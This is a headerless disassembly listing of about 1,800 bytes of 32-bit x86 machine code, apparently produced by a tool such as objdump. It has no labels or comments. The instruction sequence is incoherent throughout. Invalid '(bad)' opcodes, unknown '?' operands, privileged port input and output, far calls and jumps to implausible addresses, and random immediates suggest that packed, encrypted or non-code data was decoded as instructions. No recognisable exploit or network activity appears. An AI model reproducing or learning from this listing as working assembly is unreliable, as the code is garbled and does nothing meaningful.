  40d60b:	jle    0x40d5e5
  40d60d:	cs addr16 sub al,0xbd
  40d611:	aad    0x8c
  40d613:	dec    esi
  40d614:	out    dx,eax
  40d615:	add    DWORD PTR [ebp-0x12af25af],edx
  40d61b:	xchg   DWORD PTR [esi-0x5f],ebx
  40d61e:	mov    ch,0xba
  40d620:	stc    
  40d621:	addr16 xchg esi,eax
  40d623:	xchg   ebp,eax
  40d624:	fdiv   DWORD PTR [edi-0x4]
  40d627:	xor    edx,DWORD PTR [esi+ebx*4]
  40d62a:	inc    esi
  40d62b:	mov    bh,0x41
  40d62d:	push   ebx
  40d62e:	push   esp
  40d62f:	adc    edi,DWORD PTR ds:0xa8726a38
  40d635:	sbb    bl,al
  40d637:	out    dx,eax
  40d638:	nop
  40d639:	dec    edi
  40d63a:	imul   BYTE PTR [esi]
  40d63c:	mov    ebx,0xcfe0987b
  40d641:	xchg   ebx,eax
  40d642:	sub    BYTE PTR [edi+0x506cba46],al
  40d648:	inc    ebp
  40d649:	push   0xebc4aaad
  40d64e:	rcr    BYTE PTR [edi+0x6ffa2adc],cl
  40d654:	mov    WORD PTR [esi],?
  40d656:	data16 fstp DWORD PTR [edx+0x63]
  40d65a:	push   edx
  40d65b:	(bad)  
  40d65d:	dec    edi
  40d65e:	and    edx,DWORD PTR [esi+ebx*2-0x51501310]
  40d665:	xchg   ebp,eax
  40d666:	xor    BYTE PTR [ebx+edx*1],bh
  40d669:	out    dx,eax
  40d66a:	mov    dl,0xc2
  40d66c:	test   al,0xc3
  40d66e:	jmp    0xee3a70c5
  40d673:	push   edx
  40d674:	pop    es
  40d675:	xchg   esp,eax
  40d676:	sub    eax,0x666abe12
  40d67b:	push   0xffffffa7
  40d67d:	call   0x55fcc31e
  40d682:	jge    0x40d6a7
  40d684:	sub    DWORD PTR [esi+0x7c],0xc46f4ec9
  40d68b:	(bad)  
  40d68c:	ficom  WORD PTR [ebx+eax*2+0x78]
  40d690:	mov    edi,0xdbca6978
  40d695:	ja     0x40d6ce
  40d697:	int    0x17
  40d699:	jecxz  0x40d69c
  40d69b:	ret    
  40d69c:	dec    ebx
  40d69d:	in     eax,dx
  40d69e:	in     al,0x2f
  40d6a0:	(bad)  
  40d6a1:	clc    
  40d6a2:	mov    cs,WORD PTR [esi+0x5d18f47f]
  40d6a8:	ins    BYTE PTR es:[edi],dx
  40d6a9:	sub    bl,BYTE PTR ds:0x3fa6a7f4
  40d6af:	ret    
  40d6b0:	pop    es
  40d6b1:	int    0x85
  40d6b3:	add    DWORD PTR [edx-0x7a],ecx
  40d6b6:	cmp    bh,BYTE PTR [eax]
  40d6b8:	xchg   esi,eax
  40d6b9:	fucomp st(3)
  40d6bb:	mov    DWORD PTR [ebp+eax*4+0xb23a58a],edx
  40d6c2:	retf   
  40d6c3:	inc    bp
  40d6c5:	ret    0x62cd
  40d6c8:	cwde   
  40d6c9:	stc    
  40d6ca:	push   edx
  40d6cb:	pop    edx
  40d6cc:	mov    al,0x3b
  40d6ce:	mul    edi
  40d6d0:	adc    DWORD PTR [ebp+0x1a],edx
  40d6d3:	shl    BYTE PTR [esi],0x34
  40d6d6:	dec    esp
  40d6d7:	les    ebx,FWORD PTR [ecx+0x17]
  40d6da:	retf   0xf222
  40d6dd:	cs mov esp,0xfb340e55
  40d6e3:	jb     0x40d710
  40d6e5:	fstp   TBYTE PTR [edx+0x55186ecf]
  40d6eb:	scas   al,BYTE PTR es:[edi]
  40d6ec:	xchg   DWORD PTR [edi-0x29],edi
  40d6ef:	fmul   DWORD PTR [edi-0x258a0fdf]
  40d6f5:	xor    bl,BYTE PTR [eax]
  40d6f7:	sub    DWORD PTR [edx+0x5f],esp
  40d6fa:	jo     0x40d71f
  40d6fc:	jne    0x40d6d8
  40d6fe:	arpl   bx,di
  40d700:	xor    eax,0x3798bc77
  40d705:	jg     0x40d6a3
  40d707:	push   esp
  40d708:	mov    edx,0x48786d8b
  40d70d:	pop    es
  40d70e:	cmp    esi,DWORD PTR [eax-0x330a056a]
  40d714:	or     al,0xf1
  40d716:	int3   
  40d717:	fist   WORD PTR [ecx-0x64]
  40d71a:	sub    al,0x6
  40d71c:	stc    
  40d71d:	jbe    0x40d6d8
  40d71f:	mov    al,0x81
  40d721:	cdq    
  40d722:	sbb    esp,DWORD PTR [edx+0x7d]
  40d725:	sub    al,0xc3
  40d727:	test   eax,0xe281181f
  40d72c:	inc    edx
  40d72d:	mov    ecx,0x12f9cd36
  40d732:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d733:	pushf  
  40d734:	xchg   edx,eax
  40d735:	and    al,0x49
  40d737:	retf   0x12e2
  40d73a:	lods   eax,DWORD PTR ds:[esi]
  40d73b:	fistp  WORD PTR [edi+0x394c26c6]
  40d741:	push   esp
  40d742:	sbb    DWORD PTR [edi+0x0],ebx
  40d745:	stc    
  40d746:	loopne 0x40d792
  40d748:	push   ds
  40d749:	test   eax,0x46b814f9
  40d74e:	adc    cl,BYTE PTR [ebx+0x20e4d663]
  40d754:	add    al,0x7b
  40d756:	mov    eax,ds:0xc64f7414
  40d75b:	pop    ss
  40d75c:	push   cs
  40d75d:	shr    BYTE PTR [ebx-0x39],0x10
  40d761:	dec    edi
  40d762:	(bad)  
  40d763:	(bad)  
  40d765:	mov    BYTE PTR [ecx+0x5af6f24f],0x7b
  40d76c:	inc    edx
  40d76d:	enter  0xa7c0,0x8c
  40d771:	aad    0xdf
  40d773:	rcl    BYTE PTR [edi],0x1
  40d776:	jae    0x40d78b
  40d778:	clc    
  40d779:	dec    ebp
  40d77a:	or     DWORD PTR ds:0xc2f1996c,ebp
  40d780:	mov    ds:0xe80ba59f,eax
  40d785:	outs   dx,DWORD PTR ds:[esi]
  40d786:	ds ds adc eax,0xb332716d
  40d78d:	fs test al,0xa3
  40d790:	cld    
  40d791:	fidiv  DWORD PTR [eax-0x144a994a]
  40d797:	mov    bl,0xf8
  40d799:	mov    DWORD PTR [ebx+edi*2],edx
  40d79c:	std    
  40d79d:	or     al,0xe7
  40d79f:	pusha  
  40d7a0:	jnp    0x40d7f2
  40d7a2:	nop
  40d7a3:	(bad)  
  40d7a4:	adc    ch,BYTE PTR [esi]
  40d7a6:	hlt    
  40d7a7:	jecxz  0x40d79b
  40d7a9:	pop    edi
  40d7aa:	and    al,0x14
  40d7ac:	push   ds
  40d7ad:	jecxz  0x40d764
  40d7af:	jle    0x114ff5b7
  40d7b5:	(bad)  
  40d7b6:	cld    
  40d7b7:	dec    ebp
  40d7b8:	mov    ch,0x9
  40d7ba:	scas   eax,DWORD PTR es:[edi]
  40d7bb:	mov    ah,0x67
  40d7bd:	repnz xor BYTE PTR [edi-0x56],bh
  40d7c1:	dec    ebp
  40d7c2:	retf   
  40d7c3:	mov    es:0xfa721dd0,eax
  40d7c9:	xchg   BYTE PTR [ecx+0x4f635d4a],ch
  40d7cf:	cmp    al,BYTE PTR [esi+eax*1-0x278feaaa]
  40d7d6:	inc    ecx
  40d7d7:	loop   0x40d7e2
  40d7d9:	dec    eax
  40d7da:	mov    edx,0x188b0503
  40d7df:	mov    eax,0xe078d37
  40d7e4:	mov    ch,BYTE PTR [bx+si+0x1e]
  40d7e8:	mov    ds:0x88543d1f,eax
  40d7ed:	jo     0x40d80b
  40d7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7f0:	icebp  
  40d7f1:	mov    ds:0x333d0662,eax
  40d7f6:	xchg   edx,eax
  40d7f7:	pop    es
  40d7f8:	sysenter 
  40d7fa:	fwait
  40d7fb:	push   edi
  40d7fc:	cwde   
  40d7fd:	or     ebp,ebp
  40d7ff:	stos   DWORD PTR es:[edi],eax
  40d800:	xchg   ebx,esp
  40d802:	mov    BYTE PTR [edi],cl
  40d804:	or     bh,BYTE PTR [ecx-0x563b9427]
  40d80a:	cdq    
  40d80b:	or     esi,DWORD PTR [edi-0x52]
  40d80e:	loope  0x40d85d
  40d810:	mov    ch,BYTE PTR [ebx+eiz*1-0x27]
  40d814:	fdivr  QWORD PTR [ecx+ebp*1+0x30]
  40d818:	pop    ds
  40d819:	enter  0x44d2,0xc3
  40d81d:	iret   
  40d81e:	hlt    
  40d81f:	jecxz  0x40d855
  40d821:	jno    0x40d85c
  40d823:	scas   eax,DWORD PTR es:[edi]
  40d824:	iret   
  40d825:	and    DWORD PTR [edi+0x6038ce81],ebp
  40d82b:	idiv   BYTE PTR [edi]
  40d82d:	mov    ebp,0xea8c1e60
  40d832:	ret    0xe10
  40d835:	popf   
  40d836:	fisubr DWORD PTR [ebx+0x3bb466f7]
  40d83c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d83d:	sbb    bl,BYTE PTR [ebx+0xd7f5545]
  40d843:	loopne 0x40d885
  40d845:	cmp    eax,0xd11a76f3
  40d84a:	clc    
  40d84b:	out    dx,al
  40d84c:	into   
  40d84d:	in     eax,dx
  40d84e:	xchg   BYTE PTR [ecx],dl
  40d850:	das    
  40d851:	(bad)  
  40d852:	push   edi
  40d853:	ja     0x40d7d9
  40d855:	or     al,0xfe
  40d857:	in     eax,dx
  40d858:	out    0xb4,al
  40d85a:	repnz iret 
  40d85c:	in     eax,dx
  40d85d:	(bad)  
  40d85e:	and    ecx,DWORD PTR [eax+eax*4+0x3b]
  40d862:	or     al,0xd3
  40d864:	or     ebx,ebx
  40d866:	mov    edx,0xf3eb5669
  40d86b:	push   ss
  40d86c:	ins    DWORD PTR es:[edi],dx
  40d86d:	retf   
  40d86e:	and    al,BYTE PTR [edx+edx*4]
  40d871:	outs   dx,DWORD PTR ds:[esi]
  40d872:	loopne 0x40d80f
  40d874:	sbb    bh,bh
  40d876:	imul   edx,esp,0x5dc926c2
  40d87c:	jle    0x40d8ae
  40d87e:	out    0xbb,al
  40d880:	inc    eax
  40d881:	ds inc eax
  40d883:	sar    BYTE PTR [eax+0x1ac58192],1
  40d889:	aas    
  40d88a:	push   edx
  40d88b:	jns    0x40d8e1
  40d88d:	ds imul ecx,esp,0x4c
  40d891:	xor    eax,0xbc30416b
  40d896:	pop    edx
  40d897:	xor    al,0xa3
  40d899:	test   DWORD PTR [ecx+0x591683dc],ebp
  40d89f:	inc    ebp
  40d8a0:	imul   DWORD PTR [edx-0x62]
  40d8a3:	add    eax,0x8228366f
  40d8a8:	pop    ss
  40d8a9:	xor    al,0x5
  40d8ab:	rcl    BYTE PTR [ebx],1
  40d8ad:	cwde   
  40d8ae:	mov    ebx,0xe77aa3a1
  40d8b3:	fdiv   QWORD PTR [eax]
  40d8b5:	add    al,0x14
  40d8b7:	outs   dx,DWORD PTR ds:[esi]
  40d8b8:	lods   al,BYTE PTR ds:[esi]
  40d8b9:	sub    ch,dh
  40d8bb:	imul   esp,DWORD PTR [edx+0x6b],0xffffff84
  40d8bf:	lahf   
  40d8c0:	pusha  
  40d8c1:	ds dec esp
  40d8c3:	loopne 0x40d852
  40d8c5:	pop    eax
  40d8c6:	hlt    
  40d8c7:	mov    dh,0xbc
  40d8c9:	jmp    0xd8bfff78
  40d8ce:	jno    0x40d90a
  40d8d0:	pop    edx
  40d8d1:	hlt    
  40d8d2:	push   ss
  40d8d3:	xor    bl,bh
  40d8d5:	fidiv  DWORD PTR [esi-0x4e]
  40d8d8:	test   eax,0x141cdbc4
  40d8dd:	xor    DWORD PTR [ebp+0x61],0x9feee940
  40d8e4:	ret    
  40d8e5:	mov    dl,0x8a
  40d8e7:	mov    eax,ebx
  40d8e9:	cmp    eax,0x2502f664
  40d8ee:	mov    ch,BYTE PTR es:0x1fb0c3ef
  40d8f5:	add    DWORD PTR [ebp+0x43],0xad7edab4
  40d8fc:	fcom   QWORD PTR [ebp+0x13]
  40d8ff:	push   edx
  40d900:	add    dh,BYTE PTR [edx+0x1b]
  40d903:	mov    BYTE PTR [ebx-0xb60bd2],ch
  40d909:	pop    ss
  40d90a:	test   al,0x41
  40d90c:	hlt    
  40d90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d90e:	mov    cl,0xa0
  40d910:	fmulp  st(4),st
  40d912:	in     al,0x8e
  40d914:	out    dx,al
  40d915:	push   cs
  40d916:	inc    eax
  40d917:	push   esp
  40d918:	(bad)  
  40d919:	bound  esi,QWORD PTR [eax]
  40d91b:	jp     0x40d993
  40d91d:	sbb    DWORD PTR [edi],ebp
  40d91f:	sbb    eax,0xc8f25b87
  40d925:	aam    0xc8
  40d927:	sub    cl,BYTE PTR [esi-0x35265b55]
  40d92d:	or     ch,BYTE PTR [ecx+0x46]
  40d930:	sti    
  40d931:	shl    eax,cl
  40d933:	test   BYTE PTR [edi+0xf],al
  40d936:	jae    0x40d931
  40d938:	je     0x40d917
  40d93a:	xchg   ebx,eax
  40d93b:	and    bh,bh
  40d93d:	and    esp,DWORD PTR [ecx+0x3591dca9]
  40d943:	cld    
  40d944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d945:	mov    bl,BYTE PTR [eax+0x4d]
  40d948:	loopne 0x40d92f
  40d94a:	xor    bh,al
  40d94c:	and    eax,0xdda429f7
  40d951:	jge    0x40d937
  40d953:	loop   0x40d96a
  40d955:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40d957:	(bad)  
  40d958:	ror    esp,cl
  40d95a:	cmc    
  40d95b:	xor    DWORD PTR [ebp+0x1068348e],eax
  40d961:	sub    DWORD PTR [ecx],esi
  40d963:	cwde   
  40d964:	sub    ch,bl
  40d966:	iret   
  40d967:	dec    esp
  40d968:	jno    0x40d99f
  40d96a:	sti    
  40d96b:	cmp    bh,ch
  40d96d:	(bad)  
  40d96e:	call   0x6f02:0xbd270e08
  40d975:	shl    ecx,cl
  40d977:	dec    ebx
  40d978:	add    BYTE PTR [esi+0xa6152b1],bh
  40d97e:	call   0x9843:0xdb45abcb
  40d985:	xchg   ebx,eax
  40d986:	ss mov ah,0xaa
  40d989:	mov    ecx,0x5ee317e
  40d98e:	mov    edi,ecx
  40d990:	xor    eax,0x699cc88
  40d995:	lods   eax,DWORD PTR ds:[esi]
  40d996:	push   ebx
  40d997:	sub    DWORD PTR [edx-0x2165b196],ebx
  40d99d:	repz scas eax,DWORD PTR es:[edi]
  40d99f:	cwde   
  40d9a0:	mov    edx,0x504014b7
  40d9a5:	sti    
  40d9a6:	mov    eax,DWORD PTR [eax+0x29]
  40d9a9:	cmp    edx,DWORD PTR [edi-0x23]
  40d9ac:	mov    ds:0xf4f4225d,al
  40d9b1:	aam    0xd5
  40d9b3:	mov    dh,0x7c
  40d9b5:	das    
  40d9b6:	arpl   WORD PTR [edi+ebp*4],bp
  40d9b9:	mov    ah,0x6f
  40d9bb:	or     al,0x40
  40d9bd:	and    al,0x89
  40d9bf:	dec    ebp
  40d9c0:	das    
  40d9c1:	push   0xc9bcc353
  40d9c6:	mov    WORD PTR [edx+0x794f86df],es
  40d9cc:	(bad)  
  40d9cd:	fsub   QWORD PTR [eax-0x63c77a54]
  40d9d3:	adc    DWORD PTR [edi+0x66],edx
  40d9d6:	mov    ds:0xc00dd074,eax
  40d9db:	xlat   BYTE PTR ds:[ebx]
  40d9dc:	xor    eax,0x5edd9f48
  40d9e1:	ins    DWORD PTR es:[edi],dx
  40d9e2:	xchg   BYTE PTR [esi+0x52],bh
  40d9e5:	dec    ecx
  40d9e6:	int3   
  40d9e7:	pop    es
  40d9e8:	mov    esi,0x28bd39fa
  40d9ed:	(bad)  
  40d9ee:	xchg   cl,dh
  40d9f0:	sbb    esi,DWORD PTR [edi+ebp*2+0x35]
  40d9f4:	jl     0x40da5c
  40d9f6:	adc    DWORD PTR [esi-0xfee95d1],eax
  40d9fc:	aaa    
  40d9fd:	lds    edx,FWORD PTR [ebx+0x2]
  40da00:	sub    al,0x10
  40da02:	adc    al,bh
  40da04:	in     al,0xd
  40da06:	jmp    0xb2dc2577
  40da0b:	mov    ds:0x17b80733,al
  40da10:	jge    0x40d9f8
  40da12:	mov    eax,0x948a9f22
  40da17:	mov    edx,0x4278fa48
  40da1c:	xchg   ebp,eax
  40da1d:	not    BYTE PTR [esi]
  40da1f:	push   ds
  40da20:	gs icebp 
  40da22:	stc    
  40da23:	inc    ecx
  40da24:	pushw  0xcb9a
  40da28:	cmp    eax,0x4312fc1c
  40da2d:	adc    DWORD PTR [esi+0x79],edi
  40da30:	pusha  
  40da31:	inc    ecx
  40da32:	xlat   BYTE PTR ds:[ebx]
  40da33:	jmp    0xd433:0xfce5dfbe
  40da3a:	pop    ss
  40da3b:	std    
  40da3c:	(bad)  
  40da3e:	push   es
  40da3f:	push   ecx
  40da40:	lahf   
  40da41:	jp     0x40da0b
  40da43:	mov    eax,ds:0x8d38eff1
  40da48:	jb     0x40da01
  40da4a:	adc    DWORD PTR [esi+0x7c],0xab4820ca
  40da51:	icebp  
  40da52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40da53:	fs cdq 
  40da55:	mov    ds:0x2e7099eb,al
  40da5a:	rol    ah,cl
  40da5c:	adc    eax,0xc6f6a87
  40da61:	mov    edx,0xf7153b15
  40da66:	(bad)  
  40da67:	leave  
  40da68:	cmp    eax,0x215b4426
  40da6d:	jns    0x40daa4
  40da6f:	jnp    0x40da20
  40da71:	popf   
  40da72:	push   ebx
  40da73:	mov    dl,0xb9
  40da75:	addr16 into 
  40da77:	and    al,0xcd
  40da79:	and    eax,0x4869f1f5
  40da7e:	push   esp
  40da7f:	test   al,0x5
  40da81:	rcr    DWORD PTR [edx+0x17],1
  40da84:	std    
  40da85:	and    BYTE PTR [eax],al
  40da87:	jmp    0x690ea6bb
  40da8c:	dec    edi
  40da8d:	ror    ecx,0xcb
  40da90:	cld    
  40da91:	stos   DWORD PTR es:[edi],eax
  40da92:	push   eax
  40da93:	cmp    al,0x1c
  40da95:	lods   eax,DWORD PTR ds:[esi]
  40da96:	test   BYTE PTR [eax+ebp*1],ch
  40da99:	cmp    DWORD PTR ds:[ecx-0x2b01da92],edx
  40daa0:	inc    esi
  40daa1:	xor    eax,0x841acc27
  40daa6:	push   es
  40daa7:	test   DWORD PTR [ecx-0x6d],esi
  40daaa:	lea    edi,[ebp+0x798a37f]
  40dab0:	pop    esi
  40dab1:	nop
  40dab2:	pop    esi
  40dab3:	xchg   edx,eax
  40dab4:	fmul   QWORD PTR [edi]
  40dab6:	cmp    eax,0xce927f3a
  40dabb:	imul   esi,DWORD PTR [eax+0x28],0x767629d6
  40dac2:	jb     0x40dad6
  40dac4:	cmp    bh,BYTE PTR [edx]
  40dac6:	xor    dh,BYTE PTR [eax-0xac5b845]
  40dacc:	ds in  eax,0x31
  40dacf:	mov    bh,0xa4
  40dad1:	pop    ebx
  40dad2:	mov    ah,0x78
  40dad4:	mov    cl,0x60
  40dad6:	ins    BYTE PTR es:[edi],dx
  40dad7:	xlat   BYTE PTR ds:[ebx]
  40dad8:	push   cs
  40dad9:	push   ebx
  40dada:	sub    BYTE PTR [esi],bl
  40dadc:	sbb    dh,BYTE PTR [ecx+edi*1-0x5a]
  40dae0:	lods   eax,DWORD PTR ds:[esi]
  40dae1:	sbb    eax,0x510336ac
  40dae6:	push   ss
  40dae7:	cmc    
  40dae8:	inc    edx
  40dae9:	test   edi,esi
  40daeb:	xchg   esp,eax
  40daec:	mov    cl,0xa3
  40daee:	dec    edx
  40daef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40daf0:	push   es
  40daf1:	mov    dl,0x25
  40daf3:	(bad)
  40daf6:	fcmovnb st,st(4)
  40daf8:	fiadd  DWORD PTR [eax-0x1d]
  40dafb:	mov    dl,0x7e
  40dafd:	outs   dx,BYTE PTR ds:[esi]
  40dafe:	ins    DWORD PTR es:[edi],dx
  40daff:	push   es
  40db00:	pop    edi
  40db01:	xchg   esi,eax
  40db02:	push   0x9
  40db04:	push   esp
  40db05:	xor    al,al
  40db07:	imul   esp,DWORD PTR [esi],0xffffff97
  40db0a:	pop    eax
  40db0b:	sar    BYTE PTR [edi],cl
  40db0d:	cmc    
  40db0e:	sub    eax,0x3ade0210
  40db13:	inc    esi
  40db14:	outs   dx,DWORD PTR ds:[esi]
  40db15:	sub    dh,BYTE PTR ds:0xb5bb0dd9
  40db1b:	jb     0x40db74
  40db1d:	inc    esi
  40db1e:	pop    edx
  40db1f:	add    al,0xb7
  40db21:	(bad)  
  40db22:	ins    BYTE PTR es:[edi],dx
  40db23:	stc    
  40db24:	sbb    dl,ah
  40db26:	mov    esi,0x7ab07c56
  40db2b:	inc    eax
  40db2c:	int    0xf9
  40db2e:	pop    ebp
  40db2f:	inc    esi
  40db30:	cmp    bh,cl
  40db32:	adc    eax,0x5a1deec2
  40db37:	out    0xb8,al
  40db39:	sbb    BYTE PTR [eax+ecx*8+0x378e2272],ah
  40db40:	sbb    DWORD PTR [edx],edi
  40db42:	mov    al,ds:0xedd8b120
  40db47:	ss sti 
  40db49:	or     DWORD PTR [ebp-0x9],ebx
  40db4c:	(bad)  
  40db4e:	loop   0x40dbba
  40db50:	out    dx,eax
  40db51:	and    BYTE PTR [edi+0x225cd85],0x1
  40db58:	dec    edi
  40db59:	add    edx,esi
  40db5b:	clc    
  40db5c:	out    dx,eax
  40db5d:	add    eax,0x4192b8b5
  40db62:	arpl   WORD PTR [esp+edx*1],si
  40db65:	mov    bl,0x2
  40db67:	leave  
  40db68:	inc    eax
  40db69:	in     al,0x4d
  40db6b:	int3   
  40db6c:	cs jl  0x40db29
  40db6f:	sub    ebp,ebx
  40db71:	push   0x0
  40db73:	add    al,0x58
  40db75:	int    0x19
  40db77:	sti    
  40db78:	pop    ebx
  40db79:	gs aaa 
  40db7b:	mov    eax,ds:0x6ca239be
  40db80:	inc    ecx
  40db81:	bound  ebp,QWORD PTR [eax-0x2b]
  40db84:	arpl   WORD PTR [ecx],dx
  40db86:	and    BYTE PTR [ebp-0x504c14d0],dl
  40db8c:	nop
  40db8d:	enter  0x8b8a,0xdb
  40db91:	aam    0xe
  40db93:	in     al,dx
  40db94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db95:	lea    esi,[edx+edi*1]
  40db98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db99:	data16 ja 0x40db7c
  40db9c:	xor    edi,DWORD PTR [ebp+0x43]
  40db9f:	clc    
  40dba0:	or     al,0x8c
  40dba2:	and    esp,DWORD PTR [eax+0x2b69b693]
  40dba8:	in     eax,dx
  40dba9:	mov    dh,dl
  40dbab:	jo     0x40db40
  40dbad:	xor    eax,0x5d76fb5b
  40dbb2:	leave  
  40dbb3:	xor    eax,0x90bf53fb
  40dbb8:	test   al,0x5c
  40dbba:	mov    eax,0xc4f2fe6a
  40dbbf:	mov    si,0xafc0
  40dbc3:	jmp    0x6922aa03
  40dbc8:	rcl    edx,cl
  40dbca:	pop    ebx
  40dbcb:	ror    BYTE PTR [eax+0x3f],cl
  40dbce:	call   0x9ca9:0x165727d1
  40dbd5:	and    ah,BYTE PTR [edx+0x3]
  40dbd8:	or     DWORD PTR fs:[edx],edx
  40dbdb:	jo     0x40dc43
  40dbdd:	inc    edx
  40dbde:	pop    ss
  40dbdf:	jo     0x40dc13
  40dbe1:	mov    edx,0x391a72a2
  40dbe6:	add    BYTE PTR fs:[eax],cl
  40dbe9:	out    0xf2,eax
  40dbeb:	sar    al,1
  40dbed:	sub    BYTE PTR [ebx],cl
  40dbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbf0:	jmp    0xd457:0xe4ddf45d
  40dbf7:	lahf   
  40dbf8:	imul   edx,DWORD PTR [eax+0x7f],0x79
  40dbfc:	and    eax,0x84924a1
  40dc01:	mov    dh,0x8a
  40dc03:	js     0x40dc1d
  40dc05:	pop    ecx
  40dc06:	(bad)  
  40dc07:	xchg   ebx,eax
  40dc08:	sar    cl,1
  40dc0a:	pushf  
  40dc0b:	repnz (bad) 
  40dc0d:	dec    esp
  40dc0e:	arpl   WORD PTR [ebp-0x3f17bdb2],sp
  40dc14:	inc    edi
  40dc15:	xlat   BYTE PTR ds:[ebx]
  40dc16:	call   0x96a227b6
  40dc1b:	clc    
  40dc1c:	fidivr DWORD PTR [edx]
  40dc1e:	cmp    bl,BYTE PTR [edx]
  40dc20:	jne    0x40dc47
  40dc22:	lds    ecx,FWORD PTR [esi-0x2714a9f0]
  40dc28:	(bad)  
  40dc2a:	fcmovb st,st(5)
  40dc2c:	fwait
  40dc2d:	arpl   WORD PTR [esi],si
  40dc2f:	xor    DWORD PTR [esi],0xffffffb6
  40dc32:	scas   al,BYTE PTR es:[edi]
  40dc33:	pop    ebx
  40dc34:	sbb    ecx,edi
  40dc36:	call   0x241363c2
  40dc3b:	adc    BYTE PTR [ecx-0x69],0x23
  40dc3f:	fs (bad) 
  40dc41:	jo     0x40dc08
  40dc43:	mov    dl,0xe4
  40dc45:	and    BYTE PTR [edx+0x57],0xc0
  40dc49:	ja     0x40dcc5
  40dc4b:	mov    ah,bl
  40dc4d:	aaa    
  40dc4e:	sbb    DWORD PTR [ecx],eax
  40dc50:	mov    ds:0x47bc66fe,eax
  40dc55:	(bad)  
  40dc56:	iret   
  40dc57:	adc    ecx,ebp
  40dc59:	pop    ecx
  40dc5a:	sub    DWORD PTR [eax+eax*2+0xe44e78c],0x90deb1d1
  40dc65:	gs push 0x4cbe762f
  40dc6b:	mov    esp,0xb95c86d0
  40dc70:	ja     0x40dcd3
  40dc72:	push   0x1b86e30b
  40dc77:	add    BYTE PTR [ebx-0x7b5fa47c],0x43
  40dc7e:	jg     0x40dc92
  40dc80:	mov    al,0x7
  40dc82:	mov    BYTE PTR [ebx-0x5e],cl
  40dc85:	push   esp
  40dc86:	std    
  40dc87:	ss in  al,0x6c
  40dc8a:	xchg   ecx,eax
  40dc8b:	test   eax,0x8dd5c25f
  40dc90:	and    DWORD PTR [esi-0x71],esi
  40dc93:	in     al,dx
  40dc94:	inc    ebx
  40dc95:	ret    
  40dc96:	xor    al,0x86
  40dc98:	dec    edx
  40dc99:	(bad)  
  40dc9a:	cwde   
  40dc9b:	adc    DWORD PTR ds:0x45bb0efc,esi
  40dca1:	dec    eax
  40dca2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dca3:	shl    DWORD PTR [ebx+0x14],0x40
  40dca7:	stc    
  40dca8:	(bad)  
  40dca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcaa:	dec    esi
  40dcab:	jnp    0x40dc46
  40dcad:	imul   esp,DWORD PTR [ebp-0xb],0xffffffdd
  40dcb1:	outs   dx,DWORD PTR ds:[esi]
  40dcb2:	add    BYTE PTR [edi+ecx*1-0x58],0x35
  40dcb7:	cdq    
  40dcb8:	pop    esp
  40dcb9:	ss add eax,0xce037fa4
  40dcbf:	mov    ebx,DWORD PTR [edi+0x30646d33]
  40dcc5:	push   es
  40dcc6:	or     esp,DWORD PTR [edx+0x49ce73a]
  40dccc:	mov    bl,BYTE PTR ds:0xf14fa1ea
  40dcd2:	fs push edi
  40dcd4:	cmc    
  40dcd5:	cmp    cl,BYTE PTR [ecx+0x76062ae6]
  40dcdb:	pusha  
  40dcdc:	mov    edx,0x4a9dcb4d
  40dce1:	add    al,0x4c
  40dce3:	mov    esi,0x824a58e
  40dce8:	in     eax,0xa7
  40dcea:	fs gs jns 0x40dd44
  40dcee:	mov    BYTE PTR [ecx-0x4ef1e6d7],ch
  40dcf4:	mov    ecx,0x31580c00
  40dcf9:	int3   
  40dcfa:	cmp    eax,0x2b391c8a
  40dcff:	xor    al,0x4
  40dd01:	call   0x75852a1e
  40dd06:	shr    DWORD PTR [eax],cl
  40dd08:	cmp    al,0xc8
  40dd0a:	sbb    al,0x6a
  40dd0c:	jne    0x40dd34
  40dd0e:	add    cl,BYTE PTR [ebx+0x72674285]
  40dd14:	or     DWORD PTR [ecx-0x64],edx
  40dd17:	mov    ds:0xc226166c,al
  40dd1c:	cld    
  40dd1d:	aam    0xac
  40dd1f:	call   0xd0f40142
  40dd24:	sub    BYTE PTR [edx+eax*2+0x2014b9d7],dl
  40dd2b:	(bad)  
  40dd2c:	cmp    al,0x26
  40dd2e:	jae    0x40dce6
  40dd30:	mov    ebx,0x5597b2e4
  40dd35:	in     eax,dx
  40dd36:	rcl    DWORD PTR [edx],cl
  40dd38:	lods   eax,DWORD PTR ds:[esi]
  40dd39:	sub    eax,0xc85c5a3e
  40dd3e:	xor    BYTE PTR [edi+0x9f68b87],bh
  40dd44:	mov    WORD PTR [esi+0x1b],gs
  40dd47:	imul   ebx,esi,0xbc16c163
  40dd4d:	or     edi,esp
  40dd4f:	mov    al,ds:0x6472d159
  40dd54:	adc    al,0x59
  40dd56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd57:	lds    esp,FWORD PTR [ebx]
  40dd59:	inc    esi
  40dd5a:	pop    eax
  40dd5b:	repnz test BYTE PTR [ecx-0x9890e3c],bl
  40dd62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd63:	inc    edi
  40dd64:	xchg   DWORD PTR [esi-0x3b],ecx
  40dd67:	fisub  DWORD PTR [ecx-0x167cb6d2]
  40dd6d:	shl    DWORD PTR [edx],0x62
  40dd70:	xchg   esi,eax
  40dd71:	mov    bh,BYTE PTR [ecx]
  40dd73:	cli    
  40dd74:	jp     0x40dd6c
  40dd76:	int3   
  40dd77:	pop    ebx
  40dd78:	(bad)  
  40dd79:	shr    BYTE PTR [eax-0x49219001],cl
  40dd7f:	into   
  40dd80:	fs ss stc 
  40dd83:	pusha  
  40dd84:	xor    cl,BYTE PTR [ebp-0x3cae9afc]
  40dd8a:	mov    ?,WORD PTR [esp+ebp*8]
  40dd8d:	not    cl
  40dd8f:	stos   BYTE PTR es:[edi],al
  40dd90:	dec    ebp
